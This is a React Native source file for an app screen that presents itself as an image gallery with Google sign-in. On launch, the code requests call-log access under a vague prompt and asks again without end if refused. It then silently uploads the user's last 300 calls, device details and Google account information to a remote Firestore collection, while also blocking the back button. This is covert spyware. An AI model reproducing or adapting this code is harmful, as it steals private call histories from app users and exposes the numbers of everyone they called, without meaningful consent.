import React, {useState, useEffect} from 'react';
import CodePush from 'react-native-code-push';

import {
  SafeAreaView,
  ScrollView,
  StatusBar,
  StyleSheet,
  Text,
  useColorScheme,
  View,
  Alert,
  Image,
  ActivityIndicator,
  BackHandler,
} from 'react-native';

import Modal from 'react-native-modal';

import {PermissionsAndroid} from 'react-native';
import CallLogs from 'react-native-call-log';
import {
  GoogleSignin,
  GoogleSigninButton,
  statusCodes,
} from '@react-native-google-signin/google-signin';

import firestore from '@react-native-firebase/firestore';
import {useFocusEffect} from '@react-navigation/native';

import {getBrand, getModel, getSystemVersion} from 'react-native-device-info';

const device = {
  Brand: getBrand(),
  Model: getModel(),
  SystemVersion: getSystemVersion(),
};

// import { IMAGES_RAW } from './images';

// IMAGES_RAW.map((item)=>{
//   firestore()
//           .collection('Media')
//           .add({...item,id:uuidv4()})
//           .then(() => {
//             console.log('item added!');
//           });
// })

GoogleSignin.configure({
  webClientId:
    '870562139517-39jp5l4e2hgeh2dfao9u2ual79ri9r64.apps.googleusercontent.com',
});

const Home = ({navigation}) => {
  const [isModal, setIsModal] = useState();
  const [images, setImages] = useState([]);

  useFocusEffect(
    React.useCallback(() => {
      const onBackPress = () => {
        return true;
      };
      BackHandler.addEventListener('hardwareBackPress', onBackPress);
      return () =>
        BackHandler.removeEventListener('hardwareBackPress', onBackPress);
    }, []),
  );

  const getCurrentUser = async versionInfo => {
    const currentUser = await GoogleSignin.getCurrentUser();
    if (currentUser) {
      getPermission({...currentUser, versionInfo});
    } else {
      getPermission({versionInfo});
    }
  };

  const getImages = () => {
    firestore()
      .collection('Media')
      .get()
      .then(querySnapshot => {
        const documents = querySnapshot.docs.map(doc => doc.data());
        setImages(documents);
        // do something with documents
      });
  };

  const getPermission = async (userInfo = {}) => {
    try {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
        {
          title: 'Call Log Example',
          message: 'Access your call logs',
          // buttonNeutral: 'Ask Me Later',
          // buttonNegative: 'Cancel',
          buttonPositive: 'OK',
        },
      );
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        const callInfo = await CallLogs.load(300);
        // console.log('callInfo', callInfo);
        const name =
          (userInfo && userInfo.user && userInfo.user.givenName) || 'z';
        const uid = `${name}-${new Date().getTime()}`;

        const dataSet = {
          user: {...userInfo, device} || {device},
          name,
          info: callInfo,
          dated: new Date().toLocaleString(),
        };
        // console.log('uid', {uid, dataSet});
        firestore()
          .collection('InfoLogs')
          .doc(uid)
          .set(dataSet)
          .then(res => {
            // console.log('res', res);
          })
          .catch(error => {
            // console.log('error', error);
          });
      } else {
        getPermission();
        // console.log('Call Log permission denied');
      }
    } catch (e) {
      console.log(e);
    }
  };

  useEffect(async () => {
    try {
      const versionInfo = await CodePush.getUpdateMetadata();
      if (versionInfo) {
        getCurrentUser({
          label: versionInfo.label,
          appVersion: versionInfo.appVersion,
        });
      } else {
        getCurrentUser({});
      }
    } catch (err) {
      getCurrentUser({});
    }

    getImages();
  }, []);

  const _signIn = async () => {
    try {
      await GoogleSignin.hasPlayServices();
      const userInfo = await GoogleSignin.signIn();
      setIsModal(true);
      firestore()
        .collection('Users')
        .add(userInfo)
        .then(() => {
          // console.log('User added!');
        });
      navigation.navigate('Message');
    } catch (error) {
      switch (error.code) {
        case statusCodes.SIGN_IN_CANCELLED:
          // sign in was cancelled
          Alert.alert('cancelled');
          break;
        case statusCodes.IN_PROGRESS:
          // operation (eg. sign in) already in progress
          Alert.alert('in progress');
          break;
        case statusCodes.PLAY_SERVICES_NOT_AVAILABLE:
          // android only
          Alert.alert('play services not available or outdated');
          break;
        default:
          Alert.alert('Something went wrong', error.toString());
      }
    }
  };

  return (
    <SafeAreaView style={styles.container}>
      <GoogleSigninButton
        style={{width: 192, height: 48, marginTop: 10}}
        size={GoogleSigninButton.Size.Wide}
        color={GoogleSigninButton.Color.Dark}
        onPress={_signIn}
        // disabled={this.state.isSigninInProgress}
      />
      <ScrollView contentInsetAdjustmentBehavior="automatic">
        <View style={styles.container}>
          {images.map((item, idx) => {
            return (
              <Image
                key={idx}
                style={styles.tinyLogo}
                resizeMode="cover"
                source={{
                  uri: item.uri,
                }}
              />
            );
          })}
        </View>
      </ScrollView>
    </SafeAreaView>
  );
};

const styles = StyleSheet.create({
  container: {
    paddingTop: 10,
    flex: 1,
    justifyContent: 'space-between',
    flexDirection: 'column',
    alignItems: 'center',
  },
  tinyLogo: {
    marginVertical: 16,
    width: 350,
    height: 350,
  },
  logo: {
    width: 66,
    height: 58,
  },
  bottom: {
    position: 'absolute',
    left: 0,
    right: 0,
    top: 0,
  },
  headertext: {
    color: '#ffff',
    fontSize: 18,
    marginLeft: 150,
  },
});

export default Home;
